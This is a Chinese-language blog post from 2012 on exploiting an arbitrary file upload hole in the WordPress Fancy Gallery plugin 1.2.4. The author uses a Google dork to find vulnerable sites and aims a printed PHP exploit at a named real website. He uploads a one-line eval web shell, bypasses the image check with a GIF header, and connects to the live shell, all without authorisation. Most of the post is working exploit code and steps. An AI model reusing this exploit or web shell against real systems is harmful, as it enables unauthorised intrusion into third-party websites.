title: "Wordpress Fancy Gallery Plugin 1.2.4 漏洞利用"
id: 83
date: 2012-07-02 00:49:58
tags: 
- wordpress漏洞
categories: 
- 原创作品
- 技术文章
---

睡觉前习惯性的上http://www.exploit-db.com/看看有没有什么新出的漏洞，

刚好看到一个Wordpress Fancy Gallery Plugin 1.2.4的上传漏洞

额，其实如果是注入漏洞的话我就不看了，上传漏洞一般就是直接能够上传自己的shell后门，这样比较省事。

先找一个有fancy gallery plugin的漏洞网站，google关键词：inurl:/wp-content/plugins/radykal-fancy-gallery/

随便点击一个进去看了看：http://progressivepulse.com 发现这个网站确实存在此插件并且有列目录漏洞

[![](http://www.creturn.com/asset/uploads/2012/07/pro1.png "pro1")](http://www.creturn.com/asset/uploads/2012/07/pro1.png)
<!--more-->
可以看到目录中的文件。

下载网站上面的exp  PHP的：http://www.exploit-db.com/exploits/19398/

代码：

```php

##################################################
# Description : Wordpress Plugins - Fancy Gallery Arbitrary File Upload Vulnerability
# Version : 1.2.4
# link : http://codecanyon.net/item/fancy-gallery-wordpress-plugin/400535
# Price : 18$
# Date : 22-06-2012
# Google Dork : inurl:/wp-content/plugins/radykal-fancy-gallery/
# Site : 1337day.com Inj3ct0r Exploit Database
# Author : Sammy FORGIT - sam at opensyscom dot fr - http://www.opensyscom.fr
##################################################

Exploit :

<?php

$uploadfile=&quot;lo.php&quot;;   //$uploadfile=&quot;lo.php.gif&quot;; 原来的名字

$ch =
curl_init(&quot;http://progressivepulse.com/wp-content/plugins/radykal-fancy-gallery/admin/image-upload.php&quot;);

curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, array('file[]'=&gt;&quot;@$uploadfile&quot;));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);

print &quot;$postResult&quot;;
?>

```

看下代码说明：

```php

curl_init("http://progressivepulse.com/wp-content/plugins/radykal-fancy-gallery/admin/image-upload.php");
```

这个是目标地址，把你找到的网址替换到就可以了

根据代码提示需要上传一个后门文件lo.php.gif

那好吧就上传一句话

```php
<?php @eval($_POST['cmd']);?>
```

运行exp : php exp.php

结果悲剧的发现提示非图片文件 file is not a image:

[![](http://www.creturn.com/asset/uploads/2012/07/pro2.png "pro2")](http://www.creturn.com/asset/uploads/2012/07/pro2.png)

好吧那就上图马吧，图马我向大家都知道我就不多说了。再次上传，提示成功，但是接下来心拔凉拔凉的，看到

提示说上传确实成功了但你上传上去的还是是gif格式的文件你让我情何以堪。本以为会自动重命名为php...

本站点又不是nigx更不存在那个解析漏洞~~  放弃？肯定不愿意么。那好吧，试试直接上传php文件，结果提示

也是上面的那个非图片文件。头部加入图片的头文件能跳过验证不，试试头部加入gif图片的头部信息：

[![](http://www.creturn.com/asset/uploads/2012/07/pro3.png "pro3")](http://www.creturn.com/asset/uploads/2012/07/pro3.png)

然后再次上传试试看看成功与否：

[![](http://www.creturn.com/asset/uploads/2012/07/pro4.png "pro4")](http://www.creturn.com/asset/uploads/2012/07/pro4.png)

看到图片上面提示成功，并且是php的文件。那么菜刀连接看看~~

[![](http://www.creturn.com/asset/uploads/2012/07/pro5.png "pro5")](http://www.creturn.com/asset/uploads/2012/07/pro5.png)

看到这里，不用我再说了吧。ok 后面的你们懂得。
